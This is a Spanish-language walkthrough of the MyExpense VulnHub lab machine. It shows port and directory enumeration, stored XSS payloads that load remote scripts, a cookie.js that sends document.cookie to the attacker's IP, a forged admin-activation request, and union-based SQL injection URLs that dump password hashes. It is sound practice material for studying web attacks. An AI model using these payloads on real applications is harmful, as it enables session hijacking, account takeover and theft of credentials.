___
- Tags: #máquina #inyecciónsql #xss
___
# Escenario

> [MyExpense](https://www.vulnhub.com/entry/myexpense-1,405/): You are "Samuel Lamotte" and you have just been fired by your company "Furtura Business Informatique". Unfortunately because of your hasty departure, you did not have time to validate your expense report for your last business trip, which still amounts to 750 € corresponding to a return flight to your last customer.
> 
> Fearing that your former employer may not want to reimburse you for this expense report, you decide to hack into the internal application called **"MyExpense "** to manage employee expense reports.
> 
>So you are in your car, in the company carpark and connected to the internal Wi-Fi (the key has still not been changed after your departure). The application is protected by username/password authentication and you hope that the administrator has not yet modified or deleted your access.
>
>Your credentials were: **samuel/fzghn4lw**
>
>Once the challenge is done, the flag will be displayed on the application while being connected with your (samuel) account.

___
# Enumeración

Realizamos un escaneo de todos los puertos:

```bash
nmap -p- --open --min-rate 5000 -sS -vvv -Pn -n 192.168.18.141 -oG allPorts
```

![[Pasted image 20240731204404.png]]

Ahora realizaremos un escaneo para que nos reporte las versiones de los servicios que están corriendo en los puertos:

```bash
nmap -p80,45677,46495,56749,56789 -sCV 192.168.18.141 -oN targeted
```

![[Pasted image 20240731204559.png]]

___
# Puerto 80

En el puerto 80 nos podemos encontrar con un página web con el siguiente aspecto:

![[Pasted image 20240731204843.png]]

Si realizamos fuzzing con gobuster en busca de directorios nos encontramos con lo siguiente:

```bash
gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.18.141 -x php,html,js,txt -t 20
```

![[Pasted image 20240731205542.png]]

En el **robots.txt** observamos la siguiente ruta:

![[Pasted image 20240731205801.png]]


Nos dirigimos a dicha ruta, y vemos el siguiente panel:

![[Pasted image 20240731205907.png]]

Observamos que nuestra cuenta se cuenta **Inactiva** por lo que no podremos acceder a ella, a menos que sea reactivada por un **Admin**. Aun así probaremos a logearnos con las credenciales que se nos habían proporcionado en la página de la [máquina](https://www.vulnhub.com/entry/myexpense-1,405/) que son: **slamotte:fzghn4lw**, pero nos sale que nuestra cuenta esta bloqueada como bien sabíamos.

![[Pasted image 20240731210203.png]]

Ahora sería el momento de crear un nuevo usuario, para ello clicaremos en **Don't have an Account ?** e introducimos los datos inventados, observamos que no nos deja darle al botón de **Sign up !**, sin embargo esto se trata de código de **HTML** por lo que podremos burlarlo.

![[Pasted image 20240731210708.png]]

Haremos <kbd>CTRL</kbd> + <kbd>C</kbd>, nos ponemos con el cursor encima del elemento de **Sign up !**, y eliminamos donde pone **disabled=""** en la pestaña de **Inspector**. De esta forma nos permitirá crear un nuevo usuario.

![[Pasted image 20240731210916.png]]

Nos dirigimos a **admin/admin.php** que es donde vemos todos los usuarios, observamos que hemos podido crear uno nuevo pero este se encuentra **Inactivo**. ya que tiene que ser activado por un **Admin**.

![[Pasted image 20240731211148.png]]

Se me había olvidado mencionar que si intentamos activar la cuenta de un usuario nos saldrá el siguiente error, puesto que no disponemos de los privilegios suficientes para activarla. (no estamos logeados como ningún usuario así que tampoco)

![[Pasted image 20240731211344.png]]

## [[XSS]]

Intentaremos ver si es vulnerable a un **[[XSS]]**, para ello crearemos un nuevo usuario y cualquier campo de los que se reflejan en el **admin/admin.php** (menos el del **Username**) intentaremos colar una inyección **[[XSS]]**, en este caso he elegido el campo de **Lastname**.

Introduciremos el siguiente código **JavaScript**, el cual ejecutará una ventana emergente en el caso de que sea vulnerable a un **[[XSS]]**.

```js
<script> alert("XSS") </script>
```

> Para crear un nuevo usuario repetimos el mismo proceso de antes, inspeccionamos el elemento y eliminamos la etiqueta **disabled=""**

![[Pasted image 20240731212007.png]]

Observamos que al dirigirnos a **admin/admin.php** nos salta una ventana emergente por lo que es vulnerable a un **[[XSS]]**

![[Pasted image 20240731212039.png]]

Teniendo esto en cuenta procederemos a crear otro usuario para intentar realizar un **Cookie Hijacking**.

Introducimos el siguiente código **JavaScript**, el cual realizará una petición al siguiente recurso de nuestra [[Dirección IP]].

```js
<script src="http://192.168.18.107/cookie.js"></script>
```

> Para crear un nuevo usuario repetimos el mismo proceso de antes, inspeccionamos el elemento y eliminamos la etiqueta **disabled=""**

![[Pasted image 20240731212503.png]]

Ahora si nos montamos un servidor con python, observamos que al entrar **admin/admin.php** se realiza una petición por **GET**:

```bash
python3 -m http.server 80
```

![[Pasted image 20240731213009.png]]

Si esperamos un poco a la espera de que algún usuario entre a dicha **URL**, y así poder acontecer el **Cookie Hijacking**. Observaremos como se ha realizado una petición por **GET** al archivo **cookie.js**:

![[Pasted image 20240731214528.png]]

Ahora lo que tenemos que hacer, es configurar el archivo **cookie.js** para que nos devuelva la **cookie** del usuario, que debería ser el **Admin** puesto que es el panel de Administrador. 

Para lograr eso el contenido del archivo (**cookie.js**) debe de ser lo siguiente:

```js
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.18.104/?cookie=' + document.cookie);
request.send();
```

De esta forma, recibiremos la **cookie** que probablemente sea del usuario **Administrador**

![[Pasted image 20240731214854.png]]

Haremos <kbd>CTRL</kbd> + <kbd> C </kbd>, después nos dirigimos al apartado **Storage** y ahí es donde sustituimos nuestra **cookie** por lo del usuario al que se la hemos robado.

![[Pasted image 20240731215146.png]]

Si recargamos la página **admin/admin.php**, observamos el siguiente mensaje de error que nos dice que solo puede haber un único **Administrador** logeado al mismo tiempo.

![[Pasted image 20240731215215.png]]

Por lo que seguiremos el mismo procedimiento de antes, pero esta vez compartiremos otro recurso:

```js
<script src="http://192.168.18.107/pwned.js"></script>
```

![[Pasted image 20240731220409.png]]

El archivo **pwned.js** lo que hará será hacer una petición a `http://192.168.18.174/admin/admin.php?id=11&status=active` para intentar activar nuestra cuenta, es decir la cuenta de **Samuel**.

```js
var req = new XMLHttpRequest();
req.open('GET', 'http://192.168.18.174/admin/admin.php?id=11&status=active');
req.send();
```

Observamos que sea activado nuestra cuenta.

![[Pasted image 20240731220210.png]]

Ahora sí, probamos a logearnos con las credenciales de antes **slamotte:fzghn4lw**, y observaremos que nos podemos logear como **Samuel**:

![[Pasted image 20240731232559.png]]

Como el objetivo de esta máquina es recibir el dinero que nos deben por la auditoría que hemos hecho, nos dirigimos a este apartado y le damos a aceptar para enviar la petición para que nos pagen.

![[Pasted image 20240731232728.png]]

Si nos dirigimos a nuestro perfil, observamos que nuestro **Manager** es **Manon Riviere**, y nos da entender que es nuestro **Manager** es quien tiene que aceptar la solicitud para que nos paguen.

![[Pasted image 20240731232918.png]]

Para ello, nos dirigimos al **index.php** en el cual observamos que hay un chat que es posible que sea vulnerable a una **[[XSS]]**, haremos una comprobación igual que antes, introduciendo el siguiente contenido en el cuerpo del mensaje:

```js
<script> alert("XSS") </script>
```

![[Pasted image 20240731233203.png]]

Nos salta una alerta con el cuerpo de **XSS**, por lo que entendemos que es vulnerable otra vez a un **[[XSS]]**.   

![[Pasted image 20240731233214.png]]

Como vemos que posiblemente nuestro **Manager** se encuentre en el chat ya que ha escrito un mensaje, volveremos a probar ha aplicar un **Cookie Hijacking**, y así poder convertirnos en nuestro **Manager** y aceptar la solicitud para recibir el dinero. 

Para ello, escribiremos el siguiente cuerpo del mensaje el cual lo que hace es enviar una petición por **GET** al recurso **cookie.js** de mi [[Dirección IP]].

```js
<script src="http://192.168.18.107/cookie.js"></script>
```

![[Pasted image 20240731233708.png]]

El contenido de **cookie.js** será el mismo que antes, ya que queremos aplicar un **Cookie Hijacking**.

```js
var req = new XMLHttpRequest();
req.open('GET', 'http://192.168.18.107/?cookie=' + document.cookie);
req.send();
```

Vemos un montón de **Cookies** por lo que nos tocará ir probando hasta convertirnos en nuestro **Manager** (Manon Riviere).

![[Pasted image 20240731233952.png]]

Cuando conseguimos convertirnos en **Manon Riviere** (**mriviere**), nos dirigimos al mismo panel de antes para aceptar la validar de que se nos paguen los **700€**.

![[Pasted image 20240731235327.png]]

Ahora será el **Manager** de **Manon Riviere** quién de el último visto bueno sobre dicha solitud, observamos que nuestro **Manager** es **Paul Baudouin**. 

> Podemos volver a intentar un **Cookie Hijacking** para convertirnos en **Paul Baudouin**, es posible de que se encuentre en el chat ya que ha comentado hace poco, pero veremos que no veremos su **Cookie** por ningún lado ya que actualmente no está en el chat.
  
![[Pasted image 20240731235111.png]]

___
## [[SQL Inyection]]

Una vez probado que no podemos convertirnos en **Paul Baudouin** a través de un **Cookie Hijacking**, pasaremos a intentar una [[SQL Inyection|inyección SQL]] a través de la siguiente dirección `http://192.168.18.174/site.php?id=2`. 

En primer lugar, intentamos colar una comilla simple  (**'**) y observamos que nos da un error.

```sql
http://192.168.18.174/site.php?id=2'
```

![[Pasted image 20240801000031.png]]

Iremos cambiado el número hasta encontrar uno que no nos de error, para intentar adivinar el número de columnas.

```sql
http://192.168.18.174/site.php?id=2' order by 5-- -
```

![[Pasted image 20240801000257.png]]

Si intentamos lo anterior nos daremos cuenta que no tendremos éxito por lo que pasaremos a probar lo mismo pero sin meter la comilla simple (**'**). 

Por ejemplo cuando introducimos un **2** no nos da error por lo que procedemos a explotar la [[SQL Inyection|inyección SQL]]:

 ```sql
http://192.168.18.174/site.php?id=2 order by 2-- -
```

![[Pasted image 20240801000536.png]]

### Base de datos actual

```sql
http://192.168.18.174/site.php?id=2 union select 1,database()-- -
```

![[Pasted image 20240801000758.png]]

### Bases de Datos

```sql
http://192.168.18.174/site.php?id=2 union select 1,schema_name from information_schema.schemata-- -
```

![[Pasted image 20240801001107.png]]

### Tablas de **myexpense**

```sql
http://192.168.18.174/site.php?id=2 union select 1, table_name from information_schema.tables where table_schema = 'myexpense'-- -
```

![[Pasted image 20240801001319.png]]

### Columnas de la tabla **user** de la base de datos **myexpense**

![[Pasted image 20240801001411.png]]

### Filas de las columnas **password y username**  de la tabla **user** y la base **myexpense**

```sql
http://192.168.18.174/site.php?id=2 union select 1, group_concat(username,0x3a,password) from user-- -
```

![[Pasted image 20240801001655.png]]

### Hash

Nos dumpeamos toda la data a un fichero de texto, y aplicamos la siguiente sustitución gracias al **nvim**:

```bash
:%s/,/\r/g
```

![[Pasted image 20240801001907.png]]

Nos copiamos el **hash** de **pbaudouin** (**Paul Baudouin**), y nos dirigimos a la web de [Hashes](https://hashes.com/en/decrypt/hash para introducir dicho **hash**, y obtenemos que la contraseña en **HackMe.**

![[Pasted image 20240801002223.png]]

Por lo que probaremos a autenticarnos como **pbaudouin:HackMe** y así podemos validar nuestra solicitud para obtener la pasta.

![[Pasted image 20240801003408.png]]

Si volvemos a nuestra cuenta **slamotte**, vemos que hemos conseguido la flag por lo que hemos terminado la máquina.

![[Pasted image 20240801005428.png]]